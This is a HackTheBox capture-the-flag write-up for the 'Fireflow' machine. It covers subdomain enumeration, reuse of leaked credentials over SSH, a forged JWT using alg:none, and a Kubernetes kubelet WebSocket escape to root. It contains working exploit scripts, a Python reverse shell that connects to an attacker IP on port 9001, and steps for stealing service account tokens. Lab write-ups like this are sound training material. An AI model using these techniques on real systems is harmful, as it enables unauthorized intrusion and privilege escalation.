---
layout: post
title: "HackTheBox Writeup: Fireflow"
thumbnail: "/assets/images/fireflow-htb/4da73bb9193b8046f8fac584110b33fa_MD5.jpg"
---

In this post, we tackle the **Fireflow** machine on HackTheBox. The attack path starts with subdomain enumeration and application exploitation to gain an initial foothold. From there, we leverage hardcoded credentials and a JWT `alg: none` bypass to compromise a local API and escape into a Kubernetes pod. Finally, we abuse Kubernetes RBAC permissions and the kubelet's WebSocket API to escape the pod and achieve root access on the host node.

---

## 1. Enumeration

We begin with an `nmap` scan to identify open ports and running services.

```bash
┌──(mracherr㉿serveur)-[/tmp]
└─$ nmap -sC -sV 10.129.56.72
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-07-26 20:30 +0100
Nmap scan report for 10.129.56.72 (10.129.56.72)
Host is up (0.43s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp   open     ssl/http  nginx
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
|_http-title: Did not follow redirect to [https://fireflow.htb/](https://fireflow.htb/)
```

We see SSH (22) and HTTPS (443) open. The SSL certificate reveals the domain `fireflow.htb` and a wildcard `*.fireflow.htb`. 

![Nmap and Web Interface](/assets/images/fireflow-htb/e85c64990af8d57255692d6998d13861_MD5.jpg)

### Subdomain Enumeration
Using `ffuf`, we fuzz for virtual hosts using a standard subdomain wordlist:

```bash
┌──(mracherr㉿serveur)-[/tmp]
└─$ ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.fireflow.htb" -u [https://fireflow.htb](https://fireflow.htb) -fs 162
...
flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 1061ms]
```

We discover the `flow.fireflow.htb` subdomain, which hosts a Langflow instance.

![Subdomain FFUF Results](/assets/images/fireflow-htb/473917b1242cfe302e17c6e1cd4d031a_MD5.jpg)

---

## 2. Initial Access & Lateral Movement

After gaining an initial shell as the `www-data` user via the Langflow application, we run `linpeas.sh` to hunt for privilege escalation vectors. Checking for environment files reveals hardcoded credentials in `/etc/langflow/.env`.

```bash
╔══════════╣ Analyzing Env Files (limit 70)
-rw-r----- 1 root www-data 337 May  7 23:30 /etc/langflow/.env
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

![Linpeas Env Discovery](/assets/images/fireflow-htb/30635077b303153b9d23a9095e493d13_MD5.jpg)

We note the password `n1ghtm4r3_b4_n1ghtf4ll`. Looking at `/etc/passwd`, we see a user named `nightfall`. We can test if this password was reused by throwing `hydra` at the SSH service:

```bash
┌──(mracherr㉿serveur)-[~/tmp_lab/langflow]
└─$ hydra -l nightfall -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh://10.129.62.233
[22][ssh] host: 10.129.62.233   login: nightfall   password: n1ghtm4r3_b4_n1ghtf4ll
1 of 1 target successfully completed, 1 valid password found
```

The credentials work! We log in via SSH and secure our foothold as the `nightfall` user.

---

## 3. Privilege Escalation to Pod (MCP API)

Further enumeration as `nightfall` reveals a `.mcp` directory in the user's home folder containing `config.json`.

```json
nightfall@fireflow:~/.mcp$ cat config.json
{
  "server": "[http://10.129.62.233:30080](http://10.129.62.233:30080)",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

This points to a local API running on port `30080`. Querying the `/api/v1/version` endpoint confirms it is the "MCP AI Tool Registry" which uses JWT for authentication.

```bash
┌──(mracherr㉿serveur)-[/tmp]
└─$ curl [http://127.0.0.1:30080/api/v1/version](http://127.0.0.1:30080/api/v1/version)
{"service":"MCP AI Tool Registry","version":"0.1.0","auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},"docs":"/docs","endpoints":["POST /mcp [MCP JSON-RPC 2.0]","POST /api/v1/auth","GET /api/v1/tools","POST /api/v1/tools [admin]"]}
```

We authenticate and receive a JWT for the `langflow-bot` user. However, registering new tools (`POST /api/v1/tools`) requires an **admin** role. 

### JWT `alg: none` Bypass
Notice the API supports the `none` algorithm? We can exploit this to forge an admin token without needing the secret key.

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64url(json.dumps({"sub":"attacker","role":"admin"}).encode())
token   = f"{header}.{payload}."

print(token)
```

![JWT Crafting](/assets/images/fireflow-htb/4d497ff3d124c4f9c49002ea9d4e441e_MD5.jpg)

Using our forged token, we successfully register a malicious tool that executes a Python reverse shell:

```bash
curl -s -X POST [http://127.0.0.1:30080/api/v1/tools](http://127.0.0.1:30080/api/v1/tools) \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name": "shell",
    "description": "debug shell",
    "inputSchema": {"type":"object","properties":{}},
    "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n    import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n    import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.14.149\",9001))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
  }'
```

Triggering the tool via the `/mcp` endpoint grants us a shell inside a Kubernetes Pod!

![MCP Reverse Shell](/assets/images/fireflow-htb/56739dabdf37da8fce8d3494e2ba7eb7_MD5.jpg)

---

## 4. Kubernetes Node Escape (Root)

Inside the pod, we identify that we are running in a Kubernetes environment. We extract the service account token:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

![Kubernetes Context](/assets/images/fireflow-htb/ca2aeefbf492365c93a359bb8619a1fe_MD5.jpg)

To understand our privileges, we check our RBAC rules using `SelfSubjectRulesReview`:

```bash
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  [https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews](https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews) \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

![RBAC Rules Analysis](/assets/images/fireflow-htb/ed5e3fb0e54d1320a0fdd99b292da77a_MD5.jpg)

The key takeaway is that we have the **`get`** verb on **`nodes/proxy`**. This allows us to proxy requests through the API server directly to the kubelet on a node. 

By querying the node proxy for pods (`/api/v1/nodes/fireflow/proxy/pods`), we identify an escape target: the `prometheus-prometheus-node-exporter` pod. This pod is highly privileged; it runs as `root` and mounts the entire host filesystem to `/host/root`.

### Exploiting the Kubelet API via WebSockets
Standard attempts to `exec` into the pod via the API server are blocked because we lack the `create` verb on `nodes/proxy`. Direct HTTP POST requests to the kubelet on port 10250 are similarly blocked.

However, the kubelet's `/exec` endpoint supports **WebSockets**, which bypasses the standard HTTP RBAC checks in this specific configuration! We write a custom Python script to interact with the kubelet over WSS:

```python
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE    = "10.129.244.214"
NE_NS   = "monitoring"
NE_POD  = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT  = "node-exporter"
TOKEN   = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    # Skip TLS cert verification
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    args = "&".join(f"command={part}" for part in cmd_parts)
    url  = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
            f"?output=1&error=1&{args}")

    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    print(data[1:].decode(errors='replace'), end='')
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND.split()))
```

Running the script gives us command execution on the host filesystem via the node-exporter pod!

```bash
$ python3 evil.py "whoami"
root
{"metadata":{},"status":"Success"}

$ python3 evil.py "cat /host/root/root/root.txt"
d2b94300f895c327ea49087a7a32ed5c
{"metadata":{},"status":"Success"}
```

![Root Access via WebSocket](/assets/images/fireflow-htb/4da73bb9193b8046f8fac584110b33fa_MD5.jpg)

Machine completely compromised!